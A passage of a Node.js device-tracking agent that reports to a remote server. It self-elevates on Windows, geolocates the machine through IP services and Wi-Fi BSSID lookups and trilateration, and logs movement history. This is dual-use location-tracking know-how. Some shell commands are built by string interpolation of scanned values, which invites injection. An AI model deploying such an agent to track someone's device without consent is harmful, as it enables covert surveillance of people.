#!/usr/bin/env node

/**
 * FIND AGENT v10.0 — ADVANCED MISSING DEVICE RECOVERY
 * Real-world tracking: IP scrape, WiFi fingerprint, RSSI trilateration,
 * velocity tracking, ML decision engine, autonomous recovery loop.
 */

const WebSocket = require('ws');
const { exec, execSync } = require('child_process');
const os = require('os');
const fs = require('fs');
const path = require('path');
const { promisify } = require('util');
const crypto = require('crypto');
const http = require('http');
const https = require('https');

const execAsync = promisify(exec);

const SERVER_URL = process.env.SERVER_URL || 'https://laptop-tracker-k9vi.onrender.com';
const WS_URL = SERVER_URL.replace(/^http/, 'ws');
const API_URL = SERVER_URL + '/api';
const LOG_DIR = path.join(os.homedir(), '.laptop-tracker');
const CONFIG_FILE = path.join(LOG_DIR, 'config.json');
const HISTORY_FILE = path.join(LOG_DIR, 'location-history.json');
const FINGERPRINT_FILE = path.join(LOG_DIR, 'wifi-fingerprint.json');

let ws = null;
let deviceId = null;
let pairCode = null;
let reconnectAttempts = 0;
let isLostMode = false;
let isAdmin = false;
let lastLocation = null;
let positionHistory = [];
let networkFingerprint = {};
const RECONNECT_DELAY = 500;

if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR, { recursive: true });

// ─── PHYSICS / MATH CONSTANTS ────────────────────────────────────────────────

const LIGHT_SPEED = 299792458;           // m/s
const WIFI_FREQ_2_4GHZ = 2.4e9;         // Hz
const WIFI_FREQ_5GHZ = 5e9;             // Hz
const PATH_LOSS_EXPONENT_OFFICE = 3.5;  // Indoor
const PATH_LOSS_EXPONENT_OUTDOOR = 2.8; // Open space
const PATH_LOSS_EXPONENT_URBAN = 4.0;   // Dense urban
const FREE_SPACE_PATH_LOSS_REF = 20;    // dB at 1m reference
const EARTH_RADIUS_KM = 6371;
const KALMAN_PROCESS_NOISE = 0.03;
const KALMAN_MEASUREMENT_NOISE = 2.0;

// ─── CORE UTILITIES ─────────────────────────────────────────────────────────

function generateDeviceId() {
  const hostname = os.hostname();
  const mac = Object.values(os.networkInterfaces())
    .flat()
    .find(n => n && n.mac && n.mac !== '00:00:00:00:00:00')?.mac || hostname;
  return crypto.createHash('sha256').update(mac + hostname).digest('hex').slice(0, 16);
}

function checkAdmin() {
  try { execSync('net session', { stdio: 'ignore' }); isAdmin = true; return true; }
  catch (e) { isAdmin = false; return false; }
}

async function elevate() {
  if (process.platform !== 'win32' || checkAdmin()) return;
  log('warn', 'Elevating to admin...');
  const agentPath = process.argv[1];
  try {
    await runPowerShell(`Start-Process node -ArgumentList '"${agentPath}"' -Verb RunAs`);
    process.exit(0);
  } catch (e) { log('error', 'Elevation failed:', e.message); }
}

function log(level, ...args) {
  const ts = new Date().toISOString();
  console.log(`[${ts}] [${level.toUpperCase()}]`, ...args);
  try { fs.appendFileSync(path.join(LOG_DIR, 'agent.log'), `[${ts}] [${level}] ${args.map(a => typeof a === 'object' ? JSON.stringify(a) : a).join(' ')}\n`); } catch(e) {}
}

async function runPowerShell(command, timeoutMs = 30000) {
  try {
    const { stdout, stderr } = await execAsync(`powershell -NoProfile -NonInteractive -Command "${command.replace(/"/g, '\\"')}"`, { timeout: timeoutMs, windowsHide: true });
    return { success: true, stdout: stdout.trim(), stderr: stderr.trim() };
  } catch (err) { return { success: false, stdout: err.stdout?.trim() || '', stderr: err.stderr?.trim() || err.message }; }
}

async function runCommand(command, timeoutMs = 20000) {
  try {
    const { stdout, stderr } = await execAsync(command, { timeout: timeoutMs, windowsHide: true });
    return { success: true, stdout: stdout.trim(), stderr: stderr.trim() };
  } catch (err) { return { success: false, stdout: err.stdout?.trim() || '', stderr: err.stderr?.trim() || err.message }; }
}

async function httpPost(urlPath, body) {
  return new Promise((resolve) => {
    const data = JSON.stringify(body);
    const url = new URL(API_URL + urlPath);
    const client = url.protocol === 'https:' ? https : http;
    const req = client.request(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) },
      timeout: 15000
    }, (res) => {
      let buf = '';
      res.on('data', c => buf += c);
      res.on('end', () => { try { resolve(JSON.parse(buf)); } catch(e) { resolve(null); } });
    });
    req.on('error', () => resolve(null));
    req.on('timeout', () => { req.destroy(); resolve(null); });
    req.write(data);
    req.end();
  });
}

function send(data) {
  if (ws && ws.readyState === WebSocket.OPEN) {
    try { ws.send(JSON.stringify(data)); } catch(e) {}
  }
}

// ─── ML DECISION ENGINE ──────────────────────────────────────────────────────

class TrackingDecisionEngine {
  constructor() {
    this.weights = {
      gpsConfidence: 0.30,
      wifiConfidence: 0.25,
      ipConfidence: 0.15,
      btConfidence: 0.10,
      velocityConsistency: 0.10,
      timeDecay: 0.10
    };
    this.state = {
      confidence: 0,
      riskLevel: 'unknown',
      lastKnownGood: null,
      movementPattern: 'stationary',
      recommendedAction: 'wait',
      fusionScore: 0,
      fusedLat: 0,
      fusedLng: 0,
      fusedAccuracy: 9999,
      sourcesUsed: []
    };
    this.positionBuffer = [];
    this.velocityBuffer = [];
    this.kalmanState = null;
  }

  // ── Haversine distance (meters) ──
  haversine(lat1, lng1, lat2, lng2) {
    const R = 6371e3;
    const toRad = d => d * Math.PI / 180;
    const dLat = toRad(lat2 - lat1), dLng = toRad(lng2 - lng1);
    const a = Math.sin(dLat/2)**2 + Math.cos(toRad(lat1))*Math.cos(toRad(lat2))*Math.sin(dLng/2)**2;
    return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
  }

  // ── Log-Distance Path Loss: RSSI → distance ──
  // d = 10^((TxPower - RSSI) / (10 * n))
  rssiToDistance(rssi, txPower = -50, n = 3.5) {
    if (!rssi || rssi === 0) return 0;
    return Math.pow(10, (txPower - rssi) / (10 * n));
  }

  // ── Trilateration: 3+ AP distances → lat/lng (least-squares) ──
  trilaterate(apPositions, distances) {
    if (apPositions.length < 3) return null;
    try {
      const lat0 = apPositions[0].lat, lng0 = apPositions[0].lng;
      const R = 6371e3, toRad = d => d * Math.PI / 180;
      const A = [], b = [];
      for (let i = 1; i < apPositions.length; i++) {
        const ax = (apPositions[i].lat - lat0) * toRad(1) * R;
        const ay = (apPositions[i].lng - lng0) * toRad(1) * R * Math.cos(toRad(lat0));
        A.push([ax, ay]);
        b.push((distances[i]**2 - distances[0]**2 + ax**2 + ay**2) / 2);
      }
      const ATA = [[0,0],[0,0]], ATb = [0,0];
      for (let i = 0; i < A.length; i++) {
        ATA[0][0] += A[i][0]**2; ATA[0][1] += A[i][0]*A[i][1];
        ATA[1][0] += A[i][0]*A[i][1]; ATA[1][1] += A[i][1]**2;
        ATb[0] += A[i][0]*b[i]; ATb[1] += A[i][1]*b[i];
      }
      const det = ATA[0][0]*ATA[1][1] - ATA[0][1]*ATA[1][0];
      if (Math.abs(det) < 1e-10) return null;
      const x = (ATA[1][1]*ATb[0] - ATA[0][1]*ATb[1]) / det;
      const y = (ATA[0][0]*ATb[1] - ATA[1][0]*ATb[0]) / det;
      const rLat = lat0 + (x/R)*(180/Math.PI);
      const rLng = lng0 + (y/(R*Math.cos(toRad(lat0))))*(180/Math.PI);
      let errSum = 0;
      for (let i = 0; i < apPositions.length; i++) {
        errSum += Math.abs(this.haversine(rLat, rLng, apPositions[i].lat, apPositions[i].lng) - distances[i]);
      }
      return { lat: rLat, lng: rLng, accuracy: errSum / apPositions.length };
    } catch(e) { return null; }
  }

  // ── Kalman filter for position smoothing ──
  kalmanFilter(lat, lng, accuracy) {
    if (!this.kalmanState) {
      this.kalmanState = { lat, lng, varLat: accuracy**2, varLng: accuracy**2 };
      return { lat, lng, accuracy };
    }
    const k = this.kalmanState;
    const gLat = k.varLat / (k.varLat + accuracy**2);
    const gLng = k.varLng / (k.varLng + accuracy**2);
    k.lat += gLat * (lat - k.lat);
    k.lng += gLng * (lng - k.lng);
    k.varLat = (1 - gLat) * k.varLat + 0.01;
    k.varLng = (1 - gLng) * k.varLng + 0.01;
    return { lat: k.lat, lng: k.lng, accuracy: Math.sqrt(k.varLat + k.varLng) / 2 };
  }

  // ── Weighted centroid: combine multiple estimates ──
  weightedCentroid(estimates) {
    if (estimates.length === 0) return null;
    if (estimates.length === 1) return estimates[0];
    let tw = 0, wLat = 0, wLng = 0;
    for (const e of estimates) {
      const w = e.weight || (1 / Math.max(e.accuracy, 1));
      wLat += e.lat * w; wLng += e.lng * w; tw += w;
    }
    let accSum = 0;
    for (const e of estimates) {
      const w = e.weight || (1 / Math.max(e.accuracy, 1));
      accSum += e.accuracy * (w / tw);
    }
    return { lat: wLat/tw, lng: wLng/tw, accuracy: accSum };
  }

  // ── IP source reliability weight ──
  ipSourceWeight(source) {
    const w = { 'ip-api.com': 0.85, 'ipinfo.io': 0.80, 'ipapi.co': 0.75, 'bigdatacloud.com': 0.70 };
    return w[source] || 0.5;
  }

  // ── IP cross-reference refinement ──
  refineIPLocation(ipResults) {
    if (!ipResults || ipResults.length === 0) return null;
    const valid = ipResults.filter(r => r.lat && r.lng && r.accuracy);
    if (valid.length === 0) return null;
    const clusters = [];
    for (const r of valid) {
      let found = false;
      for (const c of clusters) {
        if (this.haversine(r.lat, r.lng, c.lat, c.lng) < 5000) {
          c.results.push(r);
          let tw = 0, wl = 0, wg = 0;
          for (const cr of c.results) {
            const w = this.ipSourceWeight(cr.source) / Math.max(cr.accuracy, 100);
            wl += cr.lat*w; wg += cr.lng*w; tw += w;
          }
          c.lat = wl/tw; c.lng = wg/tw;
          c.accuracy = c.results.reduce((s,x) => s+x.accuracy, 0) / c.results.length;
          found = true; break;
        }
      }
      if (!found) clusters.push({ lat: r.lat, lng: r.lng, accuracy: r.accuracy, results: [r] });
    }
    clusters.sort((a,b) => b.results.length - a.results.length);
    const best = clusters[0];
    best.accuracy = best.accuracy / Math.sqrt(best.results.length);
    return { lat: best.lat, lng: best.lng, accuracy: best.accuracy, sourceCount: best.results.length };
  }

  // ── Main update: fuses ALL sources ──
  update(locationData, wifiData, ipData, btData) {
    const scores = {};
    const estimates = [];
    const sourcesUsed = [];

    // GPS / location source
    if (locationData && locationData.lat && locationData.lng) {
      if (locationData.source === 'windows-gps' && locationData.accuracy < 50) {
        scores.gps = Math.max(0, 1 - locationData.accuracy/100);
        estimates.push({ lat: locationData.lat, lng: locationData.lng, accuracy: locationData.accuracy, weight: 0.35 });
        sourcesUsed.push('gps');
      } else if (locationData.source?.includes('bssid')) {
        scores.gps = Math.max(0, 1 - locationData.accuracy/500);
        estimates.push({ lat: locationData.lat, lng: locationData.lng, accuracy: locationData.accuracy, weight: 0.25 });
        sourcesUsed.push('bssid');
      } else if (locationData.source?.includes('ip')) {
        scores.gps = 0.3;
        estimates.push({ lat: locationData.lat, lng: locationData.lng, accuracy: locationData.accuracy||5000, weight: 0.15 });
        sourcesUsed.push('ip-fallback');
      } else { scores.gps = 0.2; }
    } else { scores.gps = 0; }

    // WiFi trilateration (log-distance path loss)
    if (wifiData && wifiData.length >= 3) {
      const apPos = [], dists = [];
      for (const ap of wifiData) {
        if (ap.rssi && ap.rssi !== 0 && ap.lat && ap.lng) {
          apPos.push({ lat: ap.lat, lng: ap.lng });
          dists.push(this.rssiToDistance(ap.rssi, ap.txPower||-50, ap.pathLoss||3.5));
        }
      }
      if (apPos.length >= 3) {
        const tri = this.trilaterate(apPos, dists);
        if (tri && tri.accuracy < 2000) {
          estimates.push({ lat: tri.lat, lng: tri.lng, accuracy: tri.accuracy, weight: 0.25 });
          sourcesUsed.push('wifi-trilateration');
          scores.wifi = Math.min(1, 0.5 + (apPos.length/6)*0.5);
        } else {
          const strong = wifiData.filter(a => a.rssi > -70).length;
          scores.wifi = Math.min(1, (strong/3)*0.7 + (wifiData.length/10)*0.3);
        }
      } else {
        const strong = wifiData.filter(a => a.rssi > -70).length;
        scores.wifi = Math.min(1, (strong/3)*0.7 + (wifiData.length/10)*0.3);
      }
    } else { scores.wifi = 0; }

    // IP geolocation cross-reference
    if (ipData && ipData.results) {
      const refined = this.refineIPLocation(ipData.results);
      if (refined) {
        estimates.push({ lat: refined.lat, lng: refined.lng, accuracy: refined.accuracy, weight: 0.15 });
        sourcesUsed.push('ip-crossref(' + refined.sourceCount + ')');
        scores.ip = Math.min(1, 0.3 + (refined.sourceCount/4)*0.5);
      } else if (ipData.bestResult && ipData.bestResult.lat) {
        scores.ip = 0.25;
        estimates.push({ lat: ipData.bestResult.lat, lng: ipData.bestResult.lng, accuracy: ipData.bestResult.accuracy||5000, weight: 0.15 });
        sourcesUsed.push('ip-single');
      } else { scores.ip = 0; }
    } else { scores.ip = 0; }

    // Bluetooth proximity
    if (btData && btData.length > 0) {
      const strong = btData.filter(d => d.rssi > -60).length;
      scores.bt = Math.min(1, (strong/3)*0.6 + (btData.length/10)*0.4);
      sourcesUsed.push('ble(' + btData.length + ')');
    } else { scores.bt = 0; }

    // Velocity
    if (this.positionBuffer.length >= 2) {
      const vel = this.calculateVelocity();
      scores.velocity = vel < 50 ? 1 : (vel < 200 ? 0.8 : (vel < 500 ? 0.5 : 0.2));
    } else { scores.velocity = 0.5; }

    // Time decay
    const age = locationData?.timestamp ? (Date.now()-locationData.timestamp)/1000 : 999;
    scores.timeDecay = Math.max(0, 1 - age/300);

    // Weighted fusion score
    let fusionScore = 0;
    for (const [key, weight] of Object.entries(this.weights)) {
      const scoreKey = key.replace('Confidence','').replace('Consistency','');
      fusionScore += (scores[scoreKey]||0) * weight;
    }

    // Fused position: weighted centroid + Kalman smoothing
    let fusedPos = null;
    if (estimates.length > 0) {
      fusedPos = this.weightedCentroid(estimates);
      if (fusedPos) fusedPos = this.kalmanFilter(fusedPos.lat, fusedPos.lng, fusedPos.accuracy);
    }

    this.state.confidence = fusionScore;
    this.state.fusionScore = fusionScore;
    this.state.riskLevel = fusionScore > 0.7 ? 'low' : fusionScore > 0.4 ? 'medium' : 'high';
    this.state.movementPattern = this.classifyMovement();
    this.state.recommendedAction = this.recommendAction();
    this.state.sourcesUsed = sourcesUsed;

    if (fusedPos) {
      this.state.fusedLat = fusedPos.lat;
      this.state.fusedLng = fusedPos.lng;
      this.state.fusedAccuracy = fusedPos.accuracy;
    }

    if (fusionScore > 0.6 && locationData) {
      this.state.lastKnownGood = { ...locationData, confidence: fusionScore };
    }

    return this.state;
  }

  classifyMovement() {
    if (this.velocityBuffer.length < 2) return 'insufficient-data';
    const avg = this.velocityBuffer.reduce((a,b) => a+b, 0) / this.velocityBuffer.length;
    if (avg < 0.5) return 'stationary';
    if (avg < 5) return 'walking';
    if (avg < 30) return 'vehicle-urban';
    if (avg < 100) return 'vehicle-highway';
    return 'vehicle-fast';
  }

  recommendAction() {
    const { confidence, movementPattern } = this.state;
    if (confidence < 0.2) return 'emergency-all-probes';
    if (confidence < 0.4) return 'activate-all-probes';
    if (movementPattern === 'vehicle-fast') return 'alert-high-speed';
    if (movementPattern === 'vehicle-urban') return 'track-every-10s';
    if (movementPattern === 'walking') return 'track-every-30s';
    return 'track-every-60s';
  }

  calculateVelocity() {
    if (this.positionBuffer.length < 2) return 0;
    const last = this.positionBuffer[this.positionBuffer.length-1];
    const prev = this.positionBuffer[this.positionBuffer.length-2];
    const dist = this.haversine(last.lat, last.lng, prev.lat, prev.lng);
    const dt = (last.timestamp - prev.timestamp) / 1000;
    return dt > 0 ? dist / dt : 0;
  }

  addPosition(lat, lng, accuracy, source) {
    this.positionBuffer.push({ lat, lng, accuracy, source, timestamp: Date.now() });
    if (this.positionBuffer.length > 50) this.positionBuffer.shift();
    if (this.positionBuffer.length >= 2) {
      this.velocityBuffer.push(this.calculateVelocity());
      if (this.velocityBuffer.length > 20) this.velocityBuffer.shift();
    }
  }

  getReport() {
    return {
      ...this.state,
      positionSamples: this.positionBuffer.length,
      velocitySamples: this.velocityBuffer.length,
      avgVelocity: this.velocityBuffer.length > 0
        ? this.velocityBuffer.reduce((a,b) => a+b, 0) / this.velocityBuffer.length
        : 0,
      maxVelocity: Math.max(0, ...this.velocityBuffer),
      pathDistance: this.calculatePathDistance(),
      lastUpdate: Date.now()
    };
  }

  calculatePathDistance() {
    let total = 0;
    for (let i = 1; i < this.positionBuffer.length; i++) {
      total += this.haversine(
        this.positionBuffer[i-1].lat, this.positionBuffer[i-1].lng,
        this.positionBuffer[i].lat, this.positionBuffer[i].lng
      );
    }
    return total;
  }
}

const decisionEngine = new TrackingDecisionEngine();

// ─── HAVERSINE DISTANCE (km) ────────────────────────────────────────────────

function haversineDistance(lat1, lon1, lat2, lon2) {
  const dLat = (lat2 - lat1) * Math.PI / 180;
  const dLon = (lon2 - lon1) * Math.PI / 180;
  const a = Math.sin(dLat / 2) ** 2 +
    Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
    Math.sin(dLon / 2) ** 2;
  return EARTH_RADIUS_KM * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
}

// ─── RSSI → DISTANCE (LOG-DISTANCE PATH LOSS MODEL) ─────────────────────────

function rssiToDistance(rssi, frequency = WIFI_FREQ_2_4GHZ, env = 'urban') {
  if (rssi >= 0) return 0;
  const wavelengthsq = (LIGHT_SPEED / frequency) ** 2;
  const refPower = 20 * Math.log10(4 * Math.PI / Math.sqrt(wavelengthsq)) + FREE_SPACE_PATH_LOSS_REF;
  const pathLossExponent = env === 'office' ? PATH_LOSS_EXPONENT_OFFICE :
    env === 'outdoor' ? PATH_LOSS_EXPONENT_OUTDOOR : PATH_LOSS_EXPONENT_URBAN;
  const exponent = pathLossExponent / 2;
  return Math.pow(10, (refPower - rssi) / (20 * exponent));
}

// ─── TRILATERATION (REAL MATH) ──────────────────────────────────────────────

function trilaterate(accessPoints) {
  if (accessPoints.length < 3) return null;

  const validAPs = accessPoints.filter(a => a.rssi && a.rssi > -90 && a.lat && a.lng);
  if (validAPs.length < 3) return null;

  const distances = validAPs.map(a => ({
    lat: a.lat,
    lng: a.lng,
    dist: rssiToDistance(a.rssi, a.frequency || WIFI_FREQ_2_4GHZ)
  }));

  // Convert to meters from first AP as reference
  const ref = distances[0];
  const refLat = ref.lat * Math.PI / 180;
  const refLng = ref.lng * Math.PI / 180;

  const points = distances.map(d => {
    const x = (d.lng - refLng) * Math.cos(refLat) * 111320;
    const y = (d.lat - refLat) * 110540;
    return { x, y, r: d.dist };
  });

  // Solve using least-squares: minimize ||Ax - b||^2
  // A[i] = [2(x_i - x_1), 2(y_i - y_1)]
  // b[i] = r_1^2 - r_i^2 + x_i^2 - x_1^2 + y_i^2 - y_1^2
  const n = points.length - 1;
  if (n < 2) return null;

  let A = [], b = [];
  for (let i = 1; i <= n; i++) {
    A.push([2 * (points[i].x - points[0].x), 2 * (points[i].y - points[0].y)]);
    b.push(
      points[0].r ** 2 - points[i].r ** 2 +
      points[i].x ** 2 - points[0].x ** 2 +
      points[i].y ** 2 - points[0].y ** 2
    );
  }

  // Solve: x = (A^T A)^-1 A^T b
  const AtA = [[0, 0], [0, 0]];
  const Atb = [0, 0];
  for (let i = 0; i < n; i++) {
    AtA[0][0] += A[i][0] ** 2;
    AtA[0][1] += A[i][0] * A[i][1];
    AtA[1][0] += A[i][0] * A[i][1];
    AtA[1][1] += A[i][1] ** 2;
    Atb[0] += A[i][0] * b[i];
    Atb[1] += A[i][1] * b[i];
  }

  const det = AtA[0][0] * AtA[1][1] - AtA[0][1] * AtA[1][0];
  if (Math.abs(det) < 1e-10) return null;

  const x = (AtA[1][1] * Atb[0] - AtA[0][1] * Atb[1]) / det;
  const y = (AtA[0][0] * Atb[1] - AtA[1][0] * Atb[0]) / det;

  // Convert back to lat/lng
  const resultLat = refLat + y / 110540;
  const resultLng = refLng + x / (111320 * Math.cos(refLat));

  // Calculate residual error
  let errorSum = 0;
  for (const p of points) {
    const estDist = Math.sqrt((p.x - x) ** 2 + (p.y - y) ** 2);
    errorSum += Math.abs(estDist - p.r);
  }
  const avgError = errorSum / points.length;

  return {
    lat: resultLat * 180 / Math.PI,
    lng: resultLng * 180 / Math.PI,
    accuracy: Math.round(avgError),
    source: 'trilateration',
    apCount: validAPs.length,
    timestamp: Date.now()
  };
}

// ─── KALMAN FILTER FOR POSITION SMOOTHING ────────────────────────────────────

function kalmanFilter(positions) {
  if (positions.length === 0) return null;
  if (positions.length === 1) return positions[0];

  let x = positions[0].lat;
  let y = positions[0].lng;
  let pLat = 1, pLng = 1;

  for (let i = 1; i < positions.length; i++) {
    // Predict
    const qLat = KALMAN_PROCESS_NOISE;
    const qLng = KALMAN_PROCESS_NOISE;
    pLat += qLat;
    pLng += qLng;

    // Update
    const rLat = (positions[i].accuracy || KALMAN_MEASUREMENT_NOISE) ** 2;
    const rLng = (positions[i].accuracy || KALMAN_MEASUREMENT_NOISE) ** 2;
    const kLat = pLat / (pLat + rLat);
    const kLng = pLng / (pLng + rLng);
    x += kLat * (positions[i].lat - x);
    y += kLng * (positions[i].lng - y);
    pLat *= (1 - kLat);
    pLng *= (1 - kLng);
  }

  return { lat: x, lng: y, accuracy: Math.sqrt(pLat + pLng) * 100, source: 'kalman-filtered' };
}

// ─── WIFI FINGERPRINT BUILDER ────────────────────────────────────────────────

function buildWifiFingerprint(bssids) {
  const fp = {
    timestamp: Date.now(),
    bssids: bssids.map(b => ({
      bssid: b.bssid,
      ssid: b.ssid,
      rssi: b.rssi,
      signal: b.signal,
      channel: b.channel,
      frequency: b.channel <= 14 ? WIFI_FREQ_2_4GHZ : WIFI_FREQ_5GHZ,
      estimatedDistance: rssiToDistance(b.rssi, b.channel <= 14 ? WIFI_FREQ_2_4GHZ : WIFI_FREQ_5GHZ)
    }))
  };

  // Save to history
  try {
    let history = [];
    if (fs.existsSync(FINGERPRINT_FILE)) {
      history = JSON.parse(fs.readFileSync(FINGERPRINT_FILE, 'utf8'));
    }
    history.push(fp);
    if (history.length > 200) history = history.slice(-200);
    fs.writeFileSync(FINGERPRINT_FILE, JSON.stringify(history, null, 2));
  } catch(e) {}

  return fp;
}

// ─── IP SCRAPING (MULTI-SOURCE) ─────────────────────────────────────────────

async function scrapePublicIP() {
  const https = require('https');
  const sources = [
    { url: 'https://ipinfo.io/json', weight: 0.80 },
    { url: 'https://ipapi.co/json/', weight: 0.75 },
    { url: 'https://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,query', weight: 0.85 },
    { url: 'https://api.bigdatacloud.net/data/client-ip?free=true', weight: 0.70 }
  ];

  let bestResult = null;
  const results = [];

  const fetchUrl = (url) => new Promise((resolve, reject) => {
    const req = https.get(url, { timeout: 5000 }, (res) => {
      let body = '';
      res.on('data', c => body += c);
      res.on('end', () => { try { resolve(JSON.parse(body)); } catch(e) { reject(e); } });
    });
    req.on('error', reject);
    req.on('timeout', () => { req.destroy(); reject(new Error('timeout')); });
  });

  // Fire all sources in parallel
  const settled = await Promise.allSettled(sources.map(s => fetchUrl(s.url)));

  for (let i = 0; i < settled.length; i++) {
    const r = settled[i];
    if (r.status !== 'fulfilled') continue;
    const data = r.value;
    const src = sources[i];

    const ip = data.query || data.ip || data.ipAddress;
    const lat = data.lat || data.latitude || (data.loc && parseFloat(data.loc.split(',')[0]));
    const lng = data.lon || data.longitude || (data.loc && parseFloat(data.loc.split(',')[1]));

    if (!lat || !lng) continue;

    // Estimate accuracy based on source weight and available metadata
    let accuracy = 3000; // default city-level
    if (data.accuracy) accuracy = data.accuracy;
    else if (data.country && data.city && !data.zip) accuracy = 5000;
    else if (data.city && data.zip) accuracy = 2000;
    else if (data.region && data.city) accuracy = 1500;

    // Boost accuracy if mobile/cellular detected (more precise)
    if (data.mobile || data.connection?.type === 'cellular') accuracy = Math.min(accuracy, 1000);

    results.push({
      source: src.url.split('/')[2],
      ip, lat, lng,
      city: data.city || data.cityName,
      region: data.region || data.regionName,
      country: data.country || data.countryName,
      isp: data.isp || data.org,
      accuracy,
      weight: src.weight,
      timestamp: Date.now()
    });
  }

  // Cross-reference: find consensus location
  if (results.length >= 2) {
    // Cluster results within 5km of each other
    const clusters = [];
    for (const r of results) {
      let found = false;
      for (const c of clusters) {
        const dLat = Math.abs(r.lat - c.lat);
        const dLng = Math.abs(r.lng - c.lng);
        if (dLat < 0.05 && dLng < 0.05) { // ~5km
          c.results.push(r);
          found = true; break;
        }
      }
      if (!found) clusters.push({ lat: r.lat, lng: r.lng, results: [r] });
    }
    clusters.sort((a, b) => b.results.length - a.results.length);
    const consensus = clusters[0];
    // Weighted average of consensus cluster
    let tw = 0, wlat = 0, wlng = 0;
    for (const cr of consensus.results) {
      const w = cr.weight / Math.max(cr.accuracy, 100);
      wlat += cr.lat * w; wlng += cr.lng * w; tw += w;
    }
    bestResult = {
      lat: wlat / tw, lng: wlng / tw,
      accuracy: Math.round(1500 / Math.sqrt(consensus.results.length)), // more sources = more accurate
      city: consensus.results[0].city,
      region: consensus.results[0].region,
      country: consensus.results[0].country,
      isp: consensus.results[0].isp,
      sourceCount: consensus.results.length
    };
  } else if (results.length === 1) {
    bestResult = { ...results[0] };
  }

  const uniqueIPs = [...new Set(results.map(r => r.ip).filter(Boolean))];
  if (uniqueIPs.length >= 2) log('info', `IP cross-confirmed: ${uniqueIPs[0]} from ${results.length} sources`);

  return { results, bestResult, confirmedIP: uniqueIPs[0], sourceCount: results.length };
}

// ─── RSSI-BASED TRIANGULATION FROM CELL TOWERS ───────────────────────────────

async function getCellTowerTriangulation() {
  // Get nearby WiFi networks and estimate distance from signal strength
  const wifi = await getWifiSignals();
  if (wifi.length < 3) return null;

  // Build fingerprint with estimated distances
  const fp = buildWifiFingerprint(wifi);

  // Try to look up AP positions from BSSID database
  const positionedAPs = [];
  for (const ap of fp.bssids.slice(0, 8)) {
    try {
      const res = await runCommand(`curl -s --max-time 3 "https://api.mylnikov.org/geolocation/v1/bssid?bssid=${ap.bssid}"`, 5000);
      if (res.success) {
        const d = JSON.parse(res.stdout);
        if (d.result === 200 && d.data) {
          positionedAPs.push({
            ...ap,
            lat: d.data.lat,
            lng: d.data.lon,
            range: d.data.range || 200
          });
        }
      }
    } catch(e) {}
  }

  if (positionedAPs.length >= 3) {
    const triResult = trilaterate(positionedAPs);
    if (triResult) return triResult;
  }

  // Fallback: use weighted centroid with estimated distances
  if (positionedAPs.length >= 2) {
    let totalWeight = 0, wLat = 0, wLng = 0;
    for (const ap of positionedAPs) {
      const weight = 1 / (ap.estimatedDistance ** 2 + 1);
      wLat += ap.lat * weight;
      wLng += ap.lng * weight;
      totalWeight += weight;
    }
    return {
      lat: wLat / totalWeight,
      lng: wLng / totalWeight,
      accuracy: Math.round(100 + positionedAPs.reduce((a, b) => a + b.estimatedDistance, 0) / positionedAPs.length),
      source: 'wifi-weighted-centroid',
      apCount: positionedAPs.length,
      timestamp: Date.now()
    };
  }

  return null;
}

// ─── NETWORK FINGERPRINTING ─────────────────────────────────────────────────

async function buildNetworkFingerprint() {
  const fp = { timestamp: Date.now() };

  // Gateway MAC
  fp.gatewayMac = await getGatewayMac();

  // Local IP
  const netInterfaces = os.networkInterfaces();
  for (const [name, addrs] of Object.entries(netInterfaces)) {
    for (const addr of addrs) {
      if (addr.family === 'IPv4' && !addr.internal) {
        fp.localIP = addr.address;
        fp.mac = addr.mac;
        break;
      }
    }
    if (fp.localIP) break;
  }

  // Default route
  const route = await runPowerShell('Get-NetRoute -DestinationPrefix "0.0.0.0/0" | Select-Object -First 1 NextHop,InterfaceAlias | ConvertTo-Json');
  if (route.success) {
    try {
      const r = JSON.parse(route.stdout);
      fp.gateway = r.NextHop;
      fp.interface = r.InterfaceAlias;
    } catch(e) {}
  }

  // DNS servers
  const dns = await runPowerShell('Get-DnsClientServerAddress -AddressFamily IPv4 | Select-Object -First 3 ServerAddresses | ConvertTo-Json');
  if (dns.success) {
    try { fp.dnsServers = JSON.parse(dns.stdout).ServerAddresses; } catch(e) {}
  }

  // SSID
  const ssid = await runCommand('netsh wlan show interfaces | findstr /C:"SSID"');
  if (ssid.success) fp.ssid = ssid.stdout.split(':').pop()?.trim();

  // Channel
  const chan = await runCommand('netsh wlan show interfaces | findstr /C:"Channel"');
  if (chan.success) fp.channel = parseInt(chan.stdout.split(':').pop()?.trim()) || 0;

  // BSSID of connected AP
  const bssid = await runCommand('netsh wlan show interfaces | findstr /C:"BSSID"');
  if (bssid.success) fp.connectedBSSID = bssid.stdout.split(':').slice(1).join(':').trim();

  // Signal strength of connected AP
  const sig = await runCommand('netsh wlan show interfaces | findstr /C:"Signal"');
  if (sig.success) fp.connectedSignal = parseInt(sig.stdout.split(':').pop()?.trim()) || 0;

  // Hash the fingerprint for change detection
  fp.hash = crypto.createHash('md5').update(
    (fp.gatewayMac || '') + (fp.localIP || '') + (fp.ssid || '') + (fp.channel || '')
  ).digest('hex');

  // Detect network change
  if (networkFingerprint.hash && networkFingerprint.hash !== fp.hash) {
    log('warn', `NETWORK CHANGED: ${networkFingerprint.ssid} → ${fp.ssid}`);
    fp.networkChanged = true;
    fp.previousNetwork = { ssid: networkFingerprint.ssid, bssid: networkFingerprint.connectedBSSID };
  }

  networkFingerprint = fp;
  return fp;
}

// ─── VELOCITY / PATH TRACKING ────────────────────────────────────────────────

function trackPosition(lat, lng, accuracy, source) {
  const now = Date.now();
  const entry = { lat, lng, accuracy, source, timestamp: now };

  positionHistory.push(entry);
  if (positionHistory.length > 500) positionHistory.shift();

  // Save to disk
  try { fs.writeFileSync(HISTORY_FILE, JSON.stringify(positionHistory.slice(-100))); } catch(e) {}

  // Calculate velocity
  if (positionHistory.length >= 2) {
    const prev = positionHistory[positionHistory.length - 2];
    const dist = haversineDistance(prev.lat, prev.lng, lat, lng) * 1000; // meters
    const timeDelta = (now - prev.timestamp) / 1000; // seconds
    const velocity = timeDelta > 0 ? dist / timeDelta : 0; // m/s
    const bearing = Math.atan2(lng - prev.lng, lat - prev.lat) * 180 / Math.PI;

    entry.velocity = velocity;
